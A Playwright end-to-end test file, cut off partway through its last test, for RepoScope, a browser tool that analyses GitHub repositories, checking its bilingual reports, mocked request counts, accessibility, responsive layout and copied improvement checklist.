import AxeBuilder from "@axe-core/playwright";
import { expect, test, type Page, type TestInfo } from "@playwright/test";

import {
  COMMIT_SHA,
  FIXED_NOW,
  installExternalRequestGuard,
  installGitHubRoutes,
  type RequestLedger,
} from "./fixtures";

const APP_PATH = "/";
const GITHUB_RATE_LIMIT_DOCS =
  "https://docs.github.com/en/rest/using-the-rest-api/rate-limits-for-the-rest-api";
const TYPESCRIPT_SCORES = [53, 70, 100, 100, 60, 30] as const;
const PYTHON_SCORES = [53, 50, 100, 100, 33, 30] as const;
const FIXTURE_DESCRIPTION = "A deterministic fixture repository for RepoScope.";
const TYPESCRIPT_PURPOSE =
  "This small application demonstrates deterministic, browser-side inspection of a public repository.";
const PYTHON_PURPOSE =
  "This small command-line tool demonstrates deterministic inspection of a Python repository.";
const GO_PURPOSE =
  "This small Go program demonstrates general-only inspection of a recognized but unsupported language.";
const HOSTILE_DESCRIPTION_PURPOSE =
  "Safe description text stays visible without its destination or image.";
const HOSTILE_README_PURPOSE =
  "Safe README text stays visible without its destination or image.";
const FICTION_DESCRIPTION =
  "A local-first fiction planning workbench for long-form writers and story editors.";
const FICTION_OVERVIEW =
  "Fiction Workbench is a browser-based planning studio for shaping long-form stories without sending manuscript notes to a hosted service.";
const FICTION_USE_CASES = [
  "Turn a premise into a structured story bible.",
  "Track characters, locations, and unresolved plot threads.",
  "Prepare a release briefing for an editor or writing group.",
] as const;
const FICTION_WORKFLOW = [
  "Capture the premise and intended audience.",
  "Shape characters, settings, and story constraints.",
  "Draft scenes against the shared story bible.",
  "Review continuity notes before export.",
] as const;
const FICTION_STATUS =
  "Fiction Workbench 2.4.1 is a maintained beta with a versioned local data format.";
const FICTION_NODE_RANGE = "Node.js ^20.19.0 || ^22.12.0 || >=24.0.0";
const EXPECTED_TYPESCRIPT_MARKDOWN = [
  "# RepoScope improvement checklist",
  "",
  "- Repository: owner/repo",
  `- Commit: ${COMMIT_SHA}`,
  "- Ruleset: 1.0.0",
  "- Confidence: 100% (High confidence)",
  "- Scope: complete dimensions, not preliminary; 8 selected · 8 fetched · 6 parsed",
  "",
  "## Ordered improvements",
  "",
  "1. **High priority** `maintenance.lockfile`",
  "   - Evidence: Recognized dependency lockfile present: No.",
  "   - Action: Commit the standard dependency lockfile when the project ecosystem uses one.",
  "2. **High priority** `maintenance.code-of-conduct`",
  "   - Evidence: Code of conduct present: No.",
  "   - Action: Add a code of conduct for community participation.",
  "3. **High priority** `maintenance.dependency-updates`",
  "   - Evidence: Automated dependency-update configuration present: No.",
  "   - Action: Configure Dependabot or Renovate for routine dependency updates.",
  "4. **High priority** `maintenance.security`",
  "   - Evidence: Security policy present: No.",
  "   - Action: Add a SECURITY policy with a private vulnerability-reporting path.",
  "5. **High priority** `maintenance.templates`",
  "   - Evidence: Issue or pull-request templates present: No.",
  "   - Action: Add issue or pull-request templates that request actionable context.",
  "6. **High priority** `maintenance.version-history`",
  "   - Evidence: Versioned changelog or release-notes file present: No.",
  "   - Action: Record user-visible changes in a versioned history file.",
  "7. **Medium priority** `testing.ci`",
  "   - Evidence: Recognized continuous-integration configuration present: No.",
  "   - Action: Add a CI workflow that runs repository checks automatically.",
  "8. **Medium priority** `documentation.architecture`",
  "   - Evidence: Explicit architecture evidence: No; named source areas: 1.",
  "   - Action: Explain the architecture, code map, or at least three top-level source areas.",
  "9. **Medium priority** `documentation.contributing`",
  "   - Evidence: Contribution guide present: No.",
  "   - Action: Add a CONTRIBUTING guide with a practical contributor path.",
  "10. **Medium priority** `documentation.usage`",
  "   - Evidence: Usage heading: Yes; command or concrete example: No.",
  "   - Action: Add a usage section with a command or concrete example.",
  "11. **Medium priority** `operability.entry-point`",
  "   - Evidence: Structured entry point: No; conventional entry path: Yes.",
  "   - Action: Declare an application, CLI, or library entry point in the manifest.",
  "12. **Medium priority** `operability.example`",
  "   - Evidence: Concrete example: No; prose usage description: Yes.",
  "   - Action: Add a demo, sample, or concrete API usage example.",
  "13. **Medium priority** `testing.test-source-ratio`",
  "   - Evidence: Test files: 1; supported non-test source files: 5.",
  "   - Action: Grow the test-file ratio toward at least one test file per four supported source files.",
  "14. **Medium priority** `operability.configuration`",
  "   - Evidence: Configuration example or section present: No.",
  "   - Action: Document configuration and provide a safe example file where useful.",
  "15. **Medium priority** `testing.coverage`",
  "   - Evidence: Coverage configuration or command present: No.",
  "   - Action: Add coverage-tool configuration or a coverage command.",
  "16. **Low priority** `documentation.license`",
  "   - Evidence: License file: No; API license metadata: Yes.",
  "   - Action: Add a recognized license file that states the project terms.",
  "17. **Low priority** `operability.version-history`",
  "   - Evidence: Versioned history file: No; manifest version only: Yes.",
  "   - Action: Maintain a changelog or release-notes file with version headings.",
  "",
].join("\n");

interface RuntimeMonitor {
  assertClean(): Promise<void>;
}

async function monitorRuntime(
  context: Parameters<typeof installExternalRequestGuard>[0],
  page: Page,
): Promise<RuntimeMonitor> {
  const failures: string[] = [];
  const assertExternalRequests = await installExternalRequestGuard(context);

  page.on("pageerror", (error) => {
    failures.push(`page error: ${error.message}`);
  });
  page.on("console", (message) => {
    if (message.type() === "warning" || message.type() === "error") {
      failures.push(`console ${message.type()}: ${message.text()}`);
    }
  });

  return {
    assertClean: async () => {
      await assertExternalRequests();
      expect(failures, failures.join("\n")).toEqual([]);
    },
  };
}

async function installFixedClock(page: Page): Promise<void> {
  await page.addInitScript(
    ({ fixedNow }) => {
      const NativeDate = Date;
      const timestamp = NativeDate.parse(fixedNow);

      class FixedDate extends NativeDate {
        constructor(value?: string | number | Date) {
          if (value === undefined) {
            super(timestamp);
          } else {
            super(value);
          }
        }

        static override now(): number {
          return timestamp;
        }
      }

      Object.defineProperty(globalThis, "Date", {
        configurable: true,
        writable: true,
        value: FixedDate,
      });
    },
    { fixedNow: FIXED_NOW },
  );
}

async function installWorkerActivityCounter(page: Page): Promise<void> {
  await page.addInitScript(() => {
    const NativeWorker = globalThis.Worker;
    const activity = { constructions: 0 };
    const InstrumentedWorker = new Proxy(NativeWorker, {
      construct(target, argumentsList) {
        activity.constructions += 1;
        const scriptUrl = argumentsList[0] as string | URL;
        const options = argumentsList[1] as WorkerOptions | undefined;
        return new target(scriptUrl, options);
      },
    });

    Object.defineProperty(globalThis, "__reposcopeWorkerActivity", {
      configurable: false,
      enumerable: false,
      writable: false,
      value: activity,
    });
    Object.defineProperty(globalThis, "Worker", {
      configurable: true,
      writable: true,
      value: InstrumentedWorker,
    });
  });
}

async function workerConstructionCount(page: Page): Promise<number> {
  return page.evaluate(
    () =>
      (
        globalThis as typeof globalThis & {
          __reposcopeWorkerActivity?: { constructions: number };
        }
      ).__reposcopeWorkerActivity?.constructions ?? 0,
  );
}

async function gotoLanding(page: Page): Promise<void> {
  await page.goto(APP_PATH);
  await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
}

async function submitRepository(
  page: Page,
  url = "https://github.com/owner/repo",
): Promise<void> {
  await page.getByLabel("Public GitHub repository URL").fill(url);
  await page.getByRole("button", { name: "Analyze repository" }).click();
}

async function expectReport(page: Page, name = "owner/repo"): Promise<void> {
  await expect(page.getByRole("heading", { level: 2, name })).toBeVisible({
    timeout: 30_000,
  });
}

const READER_REGION_ORDER = [
  "orientation",
  "community",
  "readme-narrative",
  "capabilities",
  "workflow",
  "claim-observation",
  "commentary",
  "decision-summary",
  "project-fit-cautions",
  "reliability",
  "architecture",
  "getting-started",
  "security-privacy",
  "maintenance-alternatives",
  "technical-appendix",
] as const;

const ENGLISH_READER_HEADINGS = [
  "Project orientation",
  "Community and maintenance facts",
  "What the README says",
  "Core capabilities",
  "Documented workflow",
  "README claims and repository observations",
  "RepoScope commentary",
  "Project decision summary",
  "Project-fit cautions",
  "Evidence of reliability",
  "How it broadly works",
  "Install, run, and develop",
  "Security and privacy risks",
  "Activity, maintenance, and alternatives",
] as const;

const CHINESE_READER_HEADINGS = [
  "项目定位",
  "社区与维护事实",
  "README 如何介绍项目",
  "核心能力",
  "README 中的工作流程",
  "README 声明与仓库观察",
  "RepoScope 解读",
  "项目决策摘要",
  "项目适用性注意事项",
  "是否靠谱",
  "整体如何运作",
  "安装、运行和二次开发",
  "安全与隐私风险",
  "活跃度、维护状况和替代方案",
] as const;

function readerSection(page: Page, section: string) {
  return page.locator(`[data-reader-section="${section}"]`);
}

function readmeRegion(page: Page, region: string) {
  return page.locator(`[data-readme-region="${region}"]`);
}

function technicalAppendix(page: Page) {
  return page.locator('[data-report-section="technical-appendix"]');
}

async function expectReaderStructure(
  page: Page,
  language: "en" | "zh",
): Promise<void> {
  const headings =
    language === "en" ? ENGLISH_READER_HEADINGS : CHINESE_READER_HEADINGS;
  for (const heading of headings) {
    await expect(
      page.getByRole("region", { name: heading, exact: true }),
    ).toBeVisible();
  }
  const order = await page
    .locator(
      '[data-readme-region], [data-reader-section], [data-report-section="technical-appendix"]',
    )
    .evaluateAll((regions) =>
      regions.map(
        (region) =>
          (region as HTMLElement).dataset.readmeRegion ??
          (region as HTMLElement).dataset.readerSection ??
          (region as HTMLElement).dataset.reportSection,
      ),
    );
  expect(order).toEqual(READER_REGION_ORDER);
}

async function expectAppendixClosed(
  page: Page,
  language: "en" | "zh" = "en",
): Promise<void> {
  const appendix = technicalAppendix(page);
  await expect(appendix).not.toHaveAttribute("open", "");
  await expect(appendix.locator(":scope > summary")).toHaveText(
    language === "en" ? "Technical evidence and methodology" : "技术证据与方法",
  );
  await expect(page.locator(".technical-overview__score strong")).toBeHidden();
}

async function openTechnicalAppendix(page: Page, language: "en" | "zh" = "en") {
  const appendix = technicalAppendix(page);
  if ((await appendix.getAttribute("open")) === null) {
    await appendix.locator(":scope > summary").click();
  }
  await expect(appendix).toHaveAttribute("open", "");
  await expect(appendix.locator(":scope > summary")).toHaveText(
    language === "en" ? "Technical evidence and methodology" : "技术证据与方法",
  );
  return appendix;
}

async function dimensionScores(page: Page): Promise<number[]> {
  const values = await page
    .locator(".dimension-score__header strong")
    .allTextContents();

  return values.map((value) => {
    const score = /(?<score>\d+)\s*\/\s*100/u.exec(value)?.groups?.score;
    if (score === undefined)
      throw new Error(`Missing dimension score: ${value}`);
    return Number(score);
  });
}

async function expectBoundedRequests(ledger: RequestLedger): Promise<void> {
  const restGets = ledger.restGets();
  const rawGets = ledger.rawGets();
  const expectedRestGets = ledger.expectedRestGets();
  const expectedRawGets = ledger.expectedRawGets();

  expect(restGets).toEqual(expectedRestGets);
  expect(restGets).toHaveLength(3);
  expect(new Set(restGets).size).toBe(restGets.length);
  expect([...rawGets].sort()).toEqual([...expectedRawGets].sort());
  expect(rawGets).toHaveLength(expectedRawGets.length);
  expect(new Set(rawGets).size).toBe(rawGets.length);
  expect(rawGets.length).toBeLessThanOrEqual(200);
  await ledger.assertComplete({ rest: 3, raw: expectedRawGets.length });
}

async function attachRequestLedger(
  ledger: RequestLedger,
  testInfo: TestInfo,
): Promise<void> {
  const rest = [...ledger.restGets()];
  const raw = [...ledger.rawGets()];
  await testInfo.attach("github-request-ledger", {
    body: JSON.stringify(
      {
        rest,
        raw,
        expectedRest: ledger.expectedRestGets(),
        expectedRaw: ledger.expectedRawGets(),
        uniqueRest: new Set(rest).size,
        uniqueRaw: new Set(raw).size,
      },
      null,
      2,
    ),
    contentType: "application/json",
  });
}

function expectAnalyzerChunks(
  ledger: RequestLedger,
  expected: { jsTs: boolean; python: boolean },
): void {
  const chunks = ledger.analyzerChunks();
  const jsTsChunks = chunks.filter((path) => /\/js-ts-[^/]+\.js$/u.test(path));
  const pythonChunks = chunks.filter((path) =>
    /\/python-[^/]+\.js$/u.test(path),
  );
  const unexpectedChunks = chunks.filter(
    (path) =>
      !/\/js-ts-[^/]+\.js$/u.test(path) && !/\/python-[^/]+\.js$/u.test(path),
  );

  expect(jsTsChunks.length > 0, `JS/TS chunks: ${JSON.stringify(chunks)}`).toBe(
    expected.jsTs,
  );
  expect(
    pythonChunks.length > 0,
    `Python chunks: ${JSON.stringify(chunks)}`,
  ).toBe(expected.python);
  expect(unexpectedChunks).toEqual([]);
}

async function expectNoSeriousAxeViolations(page: Page): Promise<void> {
  const result = await new AxeBuilder({ page })
    .withTags(["wcag2a", "wcag2aa", "wcag21a", "wcag21aa"])
    .analyze();
  const serious = result.violations.filter(
    (violation) =>
      violation.impact === "serious" || violation.impact === "critical",
  );
  expect(serious).toEqual([]);
}

async function measureViewport(page: Page, width: number): Promise<number> {
  await page.setViewportSize({ width, height: width <= 375 ? 812 : 900 });
  return page.evaluate(() =>
    Math.max(
      0,
      document.documentElement.scrollWidth -
        document.documentElement.clientWidth,
    ),
  );
}

async function expectResponsiveTargets(
  page: Page,
  testInfo: TestInfo,
): Promise<void> {
  const widths = [375, 768, 1366] as const;
  const measurements: Array<{
    width: number;
    overflow: number;
    smallestTarget: number;
  }> = [];

  for (const width of widths) {
    const overflow = await measureViewport(page, width);
    expect(overflow, `horizontal overflow at ${String(width)}px`).toBe(0);
    const targets = page.locator("a, button, input, select, summary");
    let smallestTarget = Number.POSITIVE_INFINITY;

    for (let index = 0; index < (await targets.count()); index += 1) {
      const target = targets.nth(index);
      if (!(await target.isVisible())) continue;
      const box = await target.boundingBox();
      expect(box, `missing target box at ${String(width)}px`).not.toBeNull();
      if (box === null) continue;
      smallestTarget = Math.min(smallestTarget, box.width, box.height);
      expect(
        box.width,
        `${await target.evaluate((node) => node.outerHTML)} width at ${String(width)}px`,
      ).toBeGreaterThanOrEqual(44);
      expect(
        box.height,
        `${await target.evaluate((node) => node.outerHTML)} height at ${String(width)}px`,
      ).toBeGreaterThanOrEqual(44);
    }
    measurements.push({ width, overflow, smallestTarget });
  }

  const zoomEquivalentOverflow = await measureViewport(page, 188);
  const overflowing = await page.evaluate(() =>
    [...document.querySelectorAll("*")]
      .filter(
        (element) =>
          element.getBoundingClientRect().right >
          document.documentElement.clientWidth + 0.5,
      )
      .slice(0, 12)
      .map((element) => ({
        selector: `${element.tagName.toLowerCase()}.${element.className}`,
        right: element.getBoundingClientRect().right,
        width: element.getBoundingClientRect().width,
      })),
  );
  expect(
    zoomEquivalentOverflow,
    `200% zoom-equivalent narrow reflow: ${JSON.stringify(overflowing)}`,
  ).toBe(0);
  await testInfo.attach("responsive-measurements", {
    body: JSON.stringify(
      { measurements, zoomEquivalentWidth: 188, zoomEquivalentOverflow },
      null,
      2,
    ),
    contentType: "application/json",
  });
}

async function expectKeyboardFocus(page: Page): Promise<void> {
  await page.setViewportSize({ width: 1366, height: 900 });
  const expected = page.locator(
    "a[href]:visible, button:not([disabled]):visible, input:not([disabled]):visible, select:not([disabled]):visible, summary:visible",
  );
  const expectedCount = await expected.count();
  await expected.evaluateAll((elements) => {
    elements.forEach((element, index) => {
      element.setAttribute("data-e2e-focus-id", String(index));
    });
  });
  await page.evaluate(() => {
    if (document.activeElement instanceof HTMLElement)
      document.activeElement.blur();
  });

  const visited = new Set<string>();
  for (let index = 0; index < expectedCount + 3; index += 1) {
    await page.keyboard.press("Tab");
    const focused = await page.evaluate(() => {
      const element = document.activeElement;
      if (!(element instanceof HTMLElement)) return null;
      const focusId = element.getAttribute("data-e2e-focus-id");
      if (focusId === null) return null;
      const style = getComputedStyle(element);
      return {
        identity: `${focusId}:${element.tagName}:${element.textContent.trim().slice(0, 80)}`,
        width: Number.parseFloat(style.outlineWidth),
        style: style.outlineStyle,
        color: style.outlineColor,
      };
    });
    if (focused === null) continue;
    visited.add(focused.identity);
    expect(
      focused.width,
      `focus width for ${focused.identity}`,
    ).toBeGreaterThanOrEqual(3);
    expect(focused.style, `focus style for ${focused.identity}`).not.toBe(
      "none",
    );
    expect(focused.color, `focus color for ${focused.identity}`).not.toMatch(
      /rgba\([^)]*,\s*0\)/u,
    );
  }
  expect(visited.size).toBeGreaterThanOrEqual(expectedCount);
}

function maximumDuration(value: string): number {
  return Math.max(
    ...value.split(",").map((duration) => {
      const normalized = duration.trim();
      const numeric = Number.parseFloat(normalized);
      return normalized.endsWith("ms") ? numeric / 1000 : numeric;
    }),
  );
}

async function expectReducedMotion(page: Page): Promise<void> {
  await page.emulateMedia({ reducedMotion: "reduce" });
  const durations = await page.locator("*").evaluateAll((elements) =>
    elements
      .filter(
        (element) =>
          element instanceof HTMLElement && element.getClientRects().length > 0,
      )
      .map((element) => {
        const style = getComputedStyle(element);
        return {
          transition: style.transitionDuration,
          animation: style.animationDuration,
        };
      }),
  );
  for (const duration of durations) {
    expect(maximumDuration(duration.transition)).toBeLessThanOrEqual(0.001);
    expect(maximumDuration(duration.animation)).toBeLessThanOrEqual(0.001);
  }
}

async function resetScreenshotState(page: Page): Promise<void> {
  await page.evaluate(() => {
    if (document.activeElement instanceof HTMLElement) {
      document.activeElement.blur();
    }
    window.scrollTo(0, 0);
  });
}

async function captureStableScreenshot(
  page: Page,
  path: string,
): Promise<void> {
  await resetScreenshotState(page);
  const skipLink = page.locator(".skip-link");
  await expect(skipLink).not.toBeFocused();
  const skipLinkGeometry = await skipLink.evaluate((element) => {
    const rect = element.getBoundingClientRect();
    return {
      top: rect.top,
      right: rect.right,
      bottom: rect.bottom,
      left: rect.left,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      visibility: getComputedStyle(element).visibility,
    };
  });
  expect(skipLinkGeometry.visibility).toBe("visible");
  expect(
    skipLinkGeometry.right <= 0 ||
      skipLinkGeometry.bottom <= 0 ||
      skipLinkGeometry.left >= skipLinkGeometry.viewportWidth ||
      skipLinkGeometry.top >= skipLinkGeometry.viewportHeight,
    `unfocused skip link must be fully outside the viewport: ${JSON.stringify(skipLinkGeometry)}`,
  ).toBe(true);
  const originalStyle = await skipLink.getAttribute("style");
  await skipLink.evaluate((element) => {
    (element as HTMLElement).style.visibility = "hidden";
  });
  try {
    await page.screenshot({ path, fullPage: true });
  } finally {
    await skipLink.evaluate((element, style) => {
      if (style === null) {
        element.removeAttribute("style");
      } else {
        element.setAttribute("style", style);
      }
    }, originalStyle);
  }
}

test.beforeEach(async ({ context, page }) => {
  await context.clearCookies();
  await installFixedClock(page);
  await installWorkerActivityCounter(page);
});

test("English landing submits by keyboard, announces progress, and cancels", async ({
  context,
  page,
}, testInfo) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, {
    blockFirstRest: true,
  });
  await gotoLanding(page);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await expectNoSeriousAxeViolations(page);
  await page
    .getByLabel("Public GitHub repository URL")
    .fill("https://github.com/owner/repo");
  await page.getByLabel("Public GitHub repository URL").press("Enter");
  await expect(
    page.getByRole("heading", { name: "Repository scan in progress" }),
  ).toBeVisible();
  await expect(page.getByRole("status")).toContainText(
    /Fetch repository structure|Starting repository analysis/u,
  );
  await captureStableScreenshot(
    page,
    testInfo.outputPath("landing-progress.png"),
  );
  await page.getByRole("button", { name: "Cancel analysis" }).click();
  await expect(
    page.getByRole("heading", { name: "Repository scan in progress" }),
  ).toBeHidden();
  expect(ledger.rawGets()).toHaveLength(0);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  ledger.releaseFirstRest();
  await ledger.assertComplete({ rest: 1, raw: 0 });
  await runtime.assertClean();
});

test("Chinese reader report persists and switching language does not refetch", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page);
  await gotoLanding(page);
  await page.getByRole("button", { name: "简体中文" }).click();
  await page.reload();
  await expect(page.getByLabel("公开 GitHub 项目网址")).toBeVisible();
  await page
    .getByLabel("公开 GitHub 项目网址")
    .fill("https://github.com/owner/repo");
  await page.getByRole("button", { name: "分析项目" }).click();
  await expectReport(page);
  await expectReaderStructure(page, "zh");
  const orientation = readmeRegion(page, "orientation");
  await expect(
    orientation.getByText(FIXTURE_DESCRIPTION, { exact: true }),
  ).toBeVisible();
  await expect(
    orientation.getByText(TYPESCRIPT_PURPOSE, { exact: true }),
  ).toBeVisible();
  await expect(page.getByText(COMMIT_SHA, { exact: true })).toBeVisible();
  await expectAppendixClosed(page, "zh");
  const counts = {
    rest: ledger.restGets().length,
    raw: ledger.rawGets().length,
  };
  await page.getByRole("button", { name: "English" }).click();
  await expectReaderStructure(page, "en");
  await expectAppendixClosed(page);
  await expect(page.getByText(COMMIT_SHA, { exact: true })).toBeVisible();
  expect(ledger.restGets()).toHaveLength(counts.rest);
  expect(ledger.rawGets()).toHaveLength(counts.raw);
  const appendix = await openTechnicalAppendix(page);
  await expect(
    appendix.locator(".technical-overview__score strong"),
  ).toHaveText("74 / 100");
  await expect(
    page.getByRole("heading", { name: "Repository scan in progress" }),
  ).toHaveCount(0);
  expectAnalyzerChunks(ledger, { jsTs: true, python: false });
  await expectBoundedRequests(ledger);
  await runtime.assertClean();
});

test("complete TypeScript report is decision-first, shareable, responsive, and accessible", async ({
  context,
  page,
}, testInfo) => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"], {
    origin: "http://127.0.0.1:4173",
  });
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page);
  await gotoLanding(page);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await submitRepository(page);
  await expectReport(page);
  await expectBoundedRequests(ledger);
  await expectReaderStructure(page, "en");
  const orientation = readmeRegion(page, "orientation");
  const decision = readerSection(page, "decision-summary");
  await expect(
    orientation.getByText(FIXTURE_DESCRIPTION, { exact: true }),
  ).toBeVisible();
  await expect(
    orientation.getByText(TYPESCRIPT_PURPOSE, { exact: true }),
  ).toBeVisible();
  await expect(
    decision.getByText("Sufficient evidence to continue evaluation", {
      exact: true,
    }),
  ).toBeVisible();
  await expect(
    orientation
      .getByRole("link", {
        name: "README.md at inspected commit",
      })
      .first(),
  ).toHaveAttribute(
    "href",
    `https://github.com/owner/repo/blob/${COMMIT_SHA}/README.md`,
  );
  await expectAppendixClosed(page);
  await expect(
    technicalAppendix(page)
      .getByText("documentation.readme", { exact: true })
      .first(),
  ).toBeHidden();
  await expect(
    technicalAppendix(page)
      .getByRole("link", { name: "src/index.ts, lines 4–7" })
      .first(),
  ).toBeHidden();
  await expectNoSeriousAxeViolations(page);
  await captureStableScreenshot(
    page,
    testInfo.outputPath("complete-reader-report-closed.png"),
  );
  const beforeOpen = {
    url: page.url(),
    rest: ledger.restGets().length,
    raw: ledger.rawGets().length,
  };
  const appendix = await openTechnicalAppendix(page);
  await expect(
    appendix.locator(".technical-overview__score strong"),
  ).toHaveText("74 / 100");
  await expect(
    appendix.locator(".technical-overview__metadata > div").first(),
  ).toContainText("100% · High confidence");
  expect(await dimensionScores(page)).toEqual(TYPESCRIPT_SCORES);
  await expect(page.locator("time")).toHaveAttribute("datetime", FIXED_NOW);
  expectAnalyzerChunks(ledger, { jsTs: true, python: false });
  await expect(
    appendix.getByRole("heading", { name: "Dimension scores" }),
  ).toBeVisible();
  await expect(
    appendix.locator(".dimension-score__header strong", {
      hasText: "Unavailable",
    }),
  ).toHaveCount(0);
  await expect(
    appendix.getByText("documentation.readme", { exact: true }).first(),
  ).toBeVisible();
  await expect(
    appendix.getByRole("link", { name: "src/index.ts, lines 4–7" }).first(),
  ).toBeVisible();
  await expect(
    appendix.getByRole("link", { name: "src/index.ts, lines 4–7" }).first(),
  ).toHaveAttribute(
    "href",
    `https://github.com/owner/repo/blob/${COMMIT_SHA}/src/index.ts#L4-L7`,
  );
  await appendix
    .getByRole("button", { name: "Copy improvement checklist" })
    .click();
  await expect(appendix.getByText("Copied", { exact: true })).toBeVisible();
  const clipboard = await page.evaluate(() => navigator.clipboard.readText());
  expect(clipboard).toBe(EXPECTED_TYPESCRIPT_MARKDOWN);
  expect(page.url()).toBe(beforeOpen.url);
  expect(ledger.restGets()).toHaveLength(beforeOpen.rest);
  expect(ledger.rawGets()).toHaveLength(beforeOpen.raw);
  await expectNoSeriousAxeViolations(page);
  await expectResponsiveTargets(page, testInfo);
  await expectKeyboardFocus(page);
  await expectReducedMotion(page);
  await page.setViewportSize({
    width: testInfo.project.name.startsWith("mobile") ? 375 : 1366,
    height: testInfo.project.name.startsWith("mobile") ? 812 : 900,
  });
  await captureStableScreenshot(
    page,
    testInfo.outputPath("complete-reader-report-open.png"),
  );
  await runtime.assertClean();
});

test("Fiction Workbench exposes the complete README-first human dossier", async ({
  context,
  page,
}, testInfo) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, {
    kind: "reader-complete",
  });
  await gotoLanding(page);
  await submitRepository(page);
  await expectReport(page);
  expect(await workerConstructionCount(page)).toBe(1);
  await expectBoundedRequests(ledger);
  await attachRequestLedger(ledger, testInfo);
  expect(new Set(ledger.restGets()).size).toBe(3);
  expect(new Set(ledger.rawGets()).size).toBe(14);
  expect(ledger.rawGets().length).toBeLessThan(200);
  await expectReaderStructure(page, "en");

  const orientation = readmeRegion(page, "orientation");
  await expect(
    orientation.getByText(FICTION_DESCRIPTION, { exact: true }),
  ).toBeVisible();
  await expect(
    orientation.getByText(FICTION_OVERVIEW, { exact: true }),
  ).toBeVisible();

  const community = readmeRegion(page, "community");
  await expect(community.locator("dl")).toHaveCount(1);
  await expect(community.getByRole("term")).toHaveCount(6);
  await expect(community.getByRole("definition")).toHaveCount(6);
  expect(
    await community.locator("dl > div").evaluateAll((facts) =>
      facts.map((fact) => ({
        term: fact.querySelector("dt")?.textContent,
        accessibleValue: fact.querySelector("dd")?.getAttribute("aria-label"),
        exactValue: fact.querySelector("dd")?.getAttribute("data-exact-value"),
      })),
    ),
  ).toEqual([
    { term: "Stars", accessibleValue: "Stars: 1,284", exactValue: "1284" },
    { term: "Watch", accessibleValue: "Watch: 37", exactValue: "37" },
    { term: "Forks", accessibleValue: "Forks: 146", exactValue: "146" },
    {
      term: "Open issues",
      accessibleValue: "Open issues: 23",
      exactValue: "23",
    },
    {
      term: "Last push",
      accessibleValue: "Last push: Aug 10, 2026",
      exactValue: "2026-08-10T08:00:00Z",
    },
    {
      term: "License",
      accessibleValue: "License: Recognized",
      exactValue: "present",
    },
  ]);
  await expect(community).toContainText(
    "Popularity reflects attention, not proof of quality or safety.",
  );

  const narrative = readmeRegion(page, "readme-narrative");
  for (const useCase of FICTION_USE_CASES) {
    await expect(narrative.getByText(useCase, { exact: true })).toBeVisible();
  }
  const nodeRange = narrative.getByText(FICTION_NODE_RANGE, { exact: true });
  await expect(nodeRange).toBeVisible();
  expect(
    await nodeRange.evaluate(
      (node) => node.closest("code, pre, [data-command-kind]") === null,
    ),
  ).toBe(true);
  await expect(
    page.locator("[data-command-kind] code", { hasText: FICTION_NODE_RANGE }),
  ).toHaveCount(0);
  const workflow = readmeRegion(page, "workflow");
  await expect(workflow.locator("li > p")).toHaveText(FICTION_WORKFLOW);
  await expect(
    narrative.getByText(FICTION_STATUS, { exact: true }),
  ).toBeVisible();
  expect(
    await narrative
      .getByText(FICTION_STATUS, { exact: true })
      .evaluate(
        (node) => node.closest("code, pre, [data-command-kind]") === null,
      ),
  ).toBe(true);
  await expect(page.locator("code", { hasText: "2.4.1" })).toHaveCount(0);

  const comparison = readmeRegion(page, "claim-observation");
  for (const observation of ["Application", "JavaScript / TypeScript"]) {
    await expect(
      comparison.getByText(observation, { exact: true }),
    ).toBeVisible();
  }
  await expect(
    comparison.getByRole("link", { name: "src at inspected commit" }),
  ).toHaveAttribute(
    "href",
    `https://github.com/owner/repo/tree/${COMMIT_SHA}/src`,
  );
  await expect(comparison).not.toContainText(
    /documentation\.readme|cyclomatic|function length|rule weight|score/iu,
  );

  await expect(
    readerSection(page, "decision-summary").getByText(
      "Sufficient evidence to continue evaluation",
      { exact: true },
    ),
  ).toBeVisible();

  const commands = [
    ["install", "pnpm install --frozen-lockfile"],
    ["run", "pnpm start"],
    ["develop", "pnpm dev"],
    ["test", "pnpm test"],
    ["build", "pnpm build"],
  ] as const;
  for (const [kind, command] of commands) {
    const item = page.locator(`[data-command-kind="${kind}"]`);
    const code = item.locator("code");
    await expect(code).toHaveText(command);
    expect(
      await code.evaluate((node) => node.closest("a, button") === null),
    ).toBe(true);
    await expect(
      item.getByRole("link", { name: "README.md at inspected commit" }),
    ).toHaveAttribute(
      "href",
      `https://github.com/owner/repo/blob/${COMMIT_SHA}/README.md`,
    );
  }
  const allReportCode = page.locator(".reader-report code");
  for (let index = 0; index < (await allReportCode.count()); index += 1) {
    expect(
      await allReportCode
        .nth(index)
        .evaluate((node) => node.closest("a, button") === null),
    ).toBe(true);
  }
  await expect(
    readerSection(page, "security-privacy").getByRole("link", {
      name: "SECURITY.md at inspected commit",
    }),
  ).toHaveAttribute(
    "href",
    `https://github.com/owner/repo/blob/${COMMIT_SHA}/SECURITY.md`,
  );
  const alternatives = page.getByRole("link", {
    name: "Search GitHub repositories using these evidence terms",
  });
  await expect(alternatives).toHaveAttribute(
    "href",
    "https://github.com/search?q=topic%3Aapplication%20topic%3Afixture%20topic%3Aquality&type=repositories",
  );
  await expect(alternatives).toHaveAttribute("rel", "noopener noreferrer");

  const sourceLinks = page.locator(".reader-report__source[href]");
  for (let index = 0; index < (await sourceLinks.count()); index += 1) {
    const link = sourceLinks.nth(index);
    await expect(link).toHaveAttribute(
      "href",
      new RegExp(`/(?:blob|tree)/${COMMIT_SHA}/`, "u"),
    );
    await expect(link).toHaveAttribute("target", "_blank");
    await expect(link).toHaveAttribute("rel", "noopener noreferrer");
  }

  await expectAppendixClosed(page);
  await expectNoSeriousAxeViolations(page);
  const reportView = page.locator(".report-view");
  await reportView.evaluate((node) => {
    node.setAttribute("data-e2e-report-identity", "fiction-workbench");
  });
  const beforeToggle = {
    url: page.url(),
    analyzedAt: await page.locator("time").getAttribute("datetime"),
    decision: await readerSection(page, "decision-summary").textContent(),
    rest: ledger.restGets().length,
    raw: ledger.rawGets().length,
    workerConstructions: await workerConstructionCount(page),
  };
